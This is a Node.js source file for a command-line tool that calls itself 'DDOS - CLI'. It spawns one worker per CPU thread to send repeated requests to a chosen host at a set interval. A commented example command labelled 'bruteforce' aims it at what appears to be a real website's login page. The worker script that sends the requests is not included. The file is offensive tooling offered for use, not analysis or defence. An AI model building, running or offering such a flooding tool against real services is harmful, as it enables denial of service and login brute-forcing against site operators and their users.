#!/usr/bin/env node

const yargs = require("yargs/yargs");
const { hideBin } = require("yargs/helpers");
const argv = yargs(hideBin(process.argv)).argv;
const Os = require('node:os')
const cluster = require("node:cluster");
const {
  color,
  log,
  red,
  green,
  cyan,
  cyanBright,
} = require("console-log-colors");


let threads = argv.thread ?? Os.cpus().length

cluster.setupMaster({
  exec: `${process.cwd()}/worker.mjs`,
  args: [argv.host, argv.amount, argv.interval],
});

console.log(green("Welcome to DDOS - CLI"));
console.log(`${green(argv.host)} requesting ${red(argv.amount)} for every ${red(Math.round(argv.interval/1000))}-sec with ${cyan(threads)}-threads`);
console.log(`Press ctrl+c to stop`);



for (let i = 0; i < threads; i++) {
  cluster.fork();
}
// bruteforce --thread=4 --host="http://joyhoney.in/login/login.php" --amount=10 --interval=1000

cluster.on(
  "exit",
  (worker, code, signal) =>
    void code !== 0 &&
    console.log(
      red(`
Worker ${worker.process.pid} died. Before the death he said ${signal}.`)
    )
);
